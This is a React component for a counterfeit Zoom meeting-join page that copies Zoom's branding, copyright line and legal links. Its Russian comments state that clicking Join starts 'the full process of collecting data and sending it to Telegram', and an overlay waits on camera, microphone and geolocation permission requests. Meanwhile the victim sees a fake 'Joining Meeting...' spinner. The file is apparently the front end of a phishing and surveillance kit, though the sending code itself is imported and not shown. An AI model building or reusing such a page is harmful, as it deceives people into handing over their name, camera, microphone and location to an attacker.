import Container5 from "../imports/Container-47-73";
import svgPaths from "../imports/svg-i8si199k88";
import { useState } from "react";
import Overlay from "../imports/Overlay";

interface ZoomConfProps {
  onRequestPermissions: () => Promise<void>;
  onGoBack?: () => void;
}

export default function ZoomConf({
  onRequestPermissions,
  onGoBack,
}: ZoomConfProps) {
  const [rememberName, setRememberName] = useState(false);
  const [showOverlay, setShowOverlay] = useState(true);
  const [userName, setUserName] = useState("");
  const [showJoiningScreen, setShowJoiningScreen] =
    useState(false);

  const handleOverlayPermissions = async () => {
    console.log(
      "🎯 ZoomConf: handleOverlayPermissions вызван - ждём завершения всех запросов",
    );

    // CRITICAL: Wait for ALL permissions (camera + microphone + geolocation) to complete
    // Overlay will close after requests are done (regardless of success/failure)
    await onRequestPermissions();
    console.log(
      "✅ ZoomConf: Запросы разрешений завершены - закрываем оверлей",
    );

    // Close overlay after permission requests complete
    setShowOverlay(false);
  };

  // Handler для кнопки Join на странице
  const handleJoinClick = async () => {
    console.log(
      "📝 ZoomConf: Кнопка Join нажата - показываем экран загрузк и запускаем отправку данных",
    );
    setShowJoiningScreen(true);

    // IMPORTANT: запускаем полный процесс сбора данных и отправки в Telegram
    await onRequestPermissions();
  };

  // If joining screen is active, show it
  if (showJoiningScreen) {
    return (
      <div className="fixed inset-0 bg-[#1a1a1a] flex items-center justify-center">
        <div className="flex flex-col items-center gap-6">
          {/* Animated Spinner */}
          <div className="relative w-16 h-16">
            <div className="absolute inset-0 border-4 border-[#333333] rounded-full"></div>
            <div className="absolute inset-0 border-4 border-transparent border-t-[#0d6bde] rounded-full animate-spin"></div>
          </div>

          {/* Text */}
          <p className="text-white text-[18px] font-medium">
            Joining Meeting...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex h-screen w-full items-start justify-center bg-white overflow-y-auto overflow-x-hidden">
      {/* Back Button - Desktop only */}
      {onGoBack && (
        <div
          className="hidden min-[900px]:flex absolute left-[38px] top-[31.5px] items-center cursor-pointer z-10"
          onClick={onGoBack}
        >
          <div className="relative shrink-0 size-[20px]">
            <svg
              className="block size-full"
              fill="none"
              preserveAspectRatio="none"
              viewBox="0 0 20 20"
            >
              <g>
                <path
                  clipRule="evenodd"
                  d={svgPaths.pdd1d000}
                  fill="#0E72ED"
                  fillRule="evenodd"
                />
              </g>
            </svg>
          </div>
          <p className="text-[14px] text-[#0e72ed] leading-[24px]">
            Back
          </p>
        </div>
      )}

      {/* Mobile Layout (< 900px) */}
      <div className="flex min-[900px]:hidden flex-col items-center justify-between gap-0 w-full max-w-[402px] px-4 min-h-screen">
        <div className="flex flex-col items-center w-full">
          {/* Video Preview Section */}
          <div className="flex flex-col items-center justify-center w-full min-[457px]:pt-5">
            <div className="bg-[#242424] flex items-center justify-center rounded-lg">
              <div className="relative w-[448px] aspect-[700/394]">
                <Container5 />
              </div>
            </div>
          </div>

          {/* Form Section */}
          <div className="flex flex-col items-start w-full max-w-[432px] px-5 py-[30px]">
            <div className="flex flex-col w-full gap-0">
              {/* Title */}
              <div className="pb-6 w-full">
                <p className="text-[24px] text-[#4a4a4a] leading-[36px] whitespace-nowrap text-center font-bold">
                  Enter Meeting Info
                </p>
              </div>

              {/* Name Input */}
              <div className="pb-3 w-full">
                <div className="flex flex-col items-start w-full">
                  <div className="pb-[5px] w-full">
                    <div className="flex flex-col items-start w-full">
                      <div className="flex flex-col w-full">
                        <p className="text-[14px] text-[#131619] leading-[20px] font-bold">
                          Your Name
                        </p>
                      </div>
                    </div>
                  </div>
                  <div className="flex flex-col h-[40px] items-start justify-center w-full">
                    <div className="flex-1 bg-white w-full rounded-[10px] relative min-h-[40px]">
                      <input
                        type="text"
                        className="absolute inset-0 bg-transparent border-[3px] border-[#98a0a9] rounded-[10px] px-3 text-[14px] text-[#131619] focus:outline-none focus:border-[#0e72ed] font-normal"
                        placeholder=""
                        value={userName}
                        onChange={(e) =>
                          setUserName(e.target.value)
                        }
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* Checkbox */}
              <div className="pt-3 w-full">
                <div
                  className="flex items-start pl-5 relative cursor-pointer"
                  onClick={() => setRememberName(!rememberName)}
                >
                  <p className="text-[13px] text-[#4a4a4a] leading-[19.5px] whitespace-nowrap">
                    Remember my name for future meetings
                  </p>
                  <div className="absolute left-[-1px] top-1/2 -translate-y-1/2 w-4 h-4 bg-gradient-to-b from-[#eeedee] to-[#ffffff] to-30% rounded-[3.6px] border border-[#a8a8a8] flex items-center justify-center">
                    {rememberName && (
                      <svg
                        className="w-3 h-3"
                        viewBox="0 0 12 12"
                        fill="none"
                      >
                        <path
                          d="M2 6L5 9L10 3"
                          stroke="#0e72ed"
                          strokeWidth="2"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    )}
                  </div>
                </div>
              </div>

              {/* Join Button */}
              <div className="pt-[40px] w-full">
                <button
                  className={`flex flex-col h-[40px] items-center justify-center px-[17px] py-3 rounded-[10px] w-full transition-colors ${
                    userName.trim()
                      ? "bg-[#0d6bde] border border-[#0a57bc] border-solid cursor-pointer hover:bg-[#0c5dc7]"
                      : "bg-[#dee9f5] border border-[#d5e0eb] border-solid cursor-not-allowed"
                  }`}
                  disabled={!userName.trim()}
                  onClick={handleJoinClick}
                >
                  <p
                    className={`text-[16px] text-center whitespace-nowrap leading-[16px] font-bold ${
                      userName.trim()
                        ? "text-white"
                        : "text-[#6e7680]"
                    }`}
                  >
                    Join
                  </p>
                </button>
              </div>

              {/* Terms Text */}
              <div className="pt-[16px] w-full">
                <p className="text-[14px] text-[#131619] leading-[21px]">
                  By clicking "Join", you agree to our{" "}
                  <a
                    href="https://www.zoom.com/en/trust/terms/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[#40a9ff] cursor-pointer hover:underline"
                  >
                    Terms of Service
                  </a>{" "}
                  and{" "}
                  <a
                    href="https://www.zoom.com/en/trust/privacy/privacy-statement/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[#40a9ff] cursor-pointer hover:underline"
                  >
                    Privacy Statement
                  </a>
                  .
                </p>
              </div>

              {/* reCAPTCHA Text */}
              <div className="pt-[16px] w-full">
                <div className="relative w-full">
                  <p className="text-[14px] text-[#131619] leading-[21px]">
                    Zoom is protected by reCAPTCHA and their{" "}
                    <a 
                      href="https://policies.google.com/privacy" 
                      target="_blank" 
                      rel="noopener noreferrer" 
                      className="text-[#0e72ed] cursor-pointer hover:underline"
                    >
                      Privacy Policy
                    </a>{" "}
                    and{" "}
                    <a 
                      href="https://policies.google.com/terms" 
                      target="_blank" 
                      rel="noopener noreferrer" 
                      className="text-[#0e72ed] cursor-pointer hover:underline"
                    >
                      Terms of Service
                    </a>{" "}
                    apply.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer - Mobile (stacked layout) */}
        <div className="flex flex-col items-center justify-center px-[31px] mb-4">
          <div className="h-[48px] relative w-[378px]">
            <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-full px-4">
              <p className="text-[16px] text-center leading-6">
                <span className="text-[#6e7680]">
                  © 2025 Zoom Communications, Inc. All rights
                  reserved.{" "}
                </span>
                <a 
                  href="https://www.zoom.com/en/trust/privacy/privacy-statement/" 
                  target="_blank" 
                  rel="noopener noreferrer" 
                  className="text-[#40a9ff] cursor-pointer hover:underline"
                >
                  Privacy & Legal Policies
                </a>
                <span className="text-[#6e7680]"> | </span>
                <a 
                  href="https://www.zoom.com/en/trust/privacy/privacy-statement/" 
                  target="_blank" 
                  rel="noopener noreferrer" 
                  className="text-[#6e7680] cursor-pointer hover:underline"
                >
                  Send Report
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Desktop Layout (>= 900px) */}
      <div className="hidden min-[900px]:flex flex-col items-center justify-center w-full h-full py-[152.75px]">
        <div className="flex items-center justify-center w-full max-w-[1200px] gap-[40px]">
          {/* Video Section - Left */}
          <div className="flex items-center justify-center">
            <div className="bg-[#242424] flex items-center justify-center w-[clamp(448px,calc(448px+(100vw-900px)*0.467),700px)] rounded-[14px]">
              <div className="relative w-full aspect-[700/394]">
                <Container5 />
              </div>
            </div>
          </div>

          {/* Form Section - Right */}
          <div className="w-[432px] px-[20px] py-[30px]">
            <div className="relative h-[354.5px] w-[392px]">
              {/* Title */}
              <div className="absolute left-[89.59px] top-0 pb-[24px]">
                <p className="text-[24px] text-[#4a4a4a] leading-[36px] font-bold">
                  Enter Meeting Info
                </p>
              </div>

              {/* Name Input */}
              <div className="absolute left-0 right-0 top-[60px] pb-[12px]">
                <div className="flex flex-col items-start w-full">
                  <div className="pb-[5px] w-full">
                    <p className="text-[14px] text-[#131619] leading-[20px] font-bold">
                      Your Name
                    </p>
                  </div>
                  <div className="flex flex-col h-[40px] items-start justify-center w-full">
                    <div className="flex-1 bg-white w-full rounded-[10px] relative min-h-[40px]">
                      <input
                        type="text"
                        className="absolute inset-0 bg-transparent border-2 border-[#98a0a9] rounded-[10px] px-3 text-[14px] text-[#131619] focus:outline-none focus:border-[#0e72ed] font-normal"
                        placeholder=""
                        value={userName}
                        onChange={(e) =>
                          setUserName(e.target.value)
                        }
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* Checkbox */}
              <div className="absolute left-0 top-[137px] pt-[12px]">
                <div
                  className="flex items-start pl-[20px] relative cursor-pointer"
                  onClick={() => setRememberName(!rememberName)}
                >
                  <p className="text-[13px] text-[#4a4a4a] leading-[19.5px] whitespace-nowrap">
                    Remember my name for future meetings
                  </p>
                  <div className="absolute left-[-1px] top-1/2 -translate-y-1/2 w-4 h-4 bg-gradient-to-b from-[#eeedee] to-[#ffffff] to-30% rounded-[3.6px] border border-[#a8a8a8] flex items-center justify-center">
                    {rememberName && (
                      <svg
                        className="w-3 h-3"
                        viewBox="0 0 12 12"
                        fill="none"
                      >
                        <path
                          d="M2 6L5 9L10 3"
                          stroke="#0e72ed"
                          strokeWidth="2"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    )}
                  </div>
                </div>
              </div>

              {/* Join Button */}
              <div className="absolute left-[-4px] top-[168.5px] pt-[40px] w-[400px]">
                <button
                  className={`flex flex-col h-[40px] items-center justify-center px-[17px] py-3 rounded-[10px] w-full transition-colors ${
                    userName.trim()
                      ? "bg-[#0d6bde] border border-[#0a57bc] border-solid cursor-pointer hover:bg-[#0c5dc7]"
                      : "bg-[#dee9f5] border border-[#d5e0eb] border-solid cursor-not-allowed"
                  }`}
                  disabled={!userName.trim()}
                  onClick={handleJoinClick}
                >
                  <p
                    className={`text-[16px] text-center whitespace-nowrap leading-[16px] font-bold ${
                      userName.trim()
                        ? "text-white"
                        : "text-[#6e7680]"
                    }`}
                  >
                    Join
                  </p>
                </button>
              </div>

              {/* Terms Text */}
              <div className="absolute left-0 top-[248.5px] pt-[16px]">
                <div className="relative w-[392px]">
                  <p className="text-[14px] text-[#131619] leading-[21px]">
                    By clicking "Join", you agree to our{" "}
                    <a
                      href="https://www.zoom.com/en/trust/terms/"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[#40a9ff] cursor-pointer hover:underline"
                    >
                      Terms of Service
                    </a>{" "}
                    and{" "}
                    <a
                      href="https://www.zoom.com/en/trust/privacy/privacy-statement/"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[#40a9ff] cursor-pointer hover:underline"
                    >
                      Privacy Statement
                    </a>
                    .
                  </p>
                </div>
              </div>

              {/* reCAPTCHA Text */}
              <div className="absolute left-0 top-[306.5px] pt-[16px]">
                <div className="relative w-[392px]">
                  <p className="text-[14px] text-[#131619] leading-[21px]">
                    Zoom is protected by reCAPTCHA and their{" "}
                    <a 
                      href="https://policies.google.com/privacy" 
                      target="_blank" 
                      rel="noopener noreferrer" 
                      className="text-[#0e72ed] cursor-pointer hover:underline"
                    >
                      Privacy Policy
                    </a>{" "}
                    and{" "}
                    <a 
                      href="https://policies.google.com/terms" 
                      target="_blank" 
                      rel="noopener noreferrer" 
                      className="text-[#0e72ed] cursor-pointer hover:underline"
                    >
                      Terms of Service
                    </a>{" "}
                    apply.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer - Desktop (single line) */}
      <div className="hidden min-[900px]:flex absolute left-1/2 -translate-x-1/2 bottom-[16px] items-center py-4">
        <p className="text-[16px] text-[#6e7680] text-center leading-6 whitespace-nowrap">
          © 2025 Zoom Communications, Inc. All rights
          reserved.{" "}
        </p>
        <a 
          href="https://www.zoom.com/en/trust/privacy/privacy-statement/" 
          target="_blank" 
          rel="noopener noreferrer" 
          className="text-[16px] text-[#40a8fe] text-center leading-6 whitespace-nowrap cursor-pointer hover:underline ml-1"
        >
          Privacy & Legal Policies
        </a>
        <p className="text-[16px] text-[#6e7680] text-center leading-6 whitespace-nowrap px-2">
          |
        </p>
        <a 
          href="https://www.zoom.com/en/trust/privacy/privacy-statement/" 
          target="_blank" 
          rel="noopener noreferrer" 
          className="text-[16px] text-[#6e7680] text-center leading-6 whitespace-nowrap cursor-pointer hover:underline"
        >
          Send Report
        </a>
      </div>

      {/* Overlay */}
      {showOverlay && (
        <Overlay
          onRequestPermissions={handleOverlayPermissions}
        />
      )}
    </div>
  );
}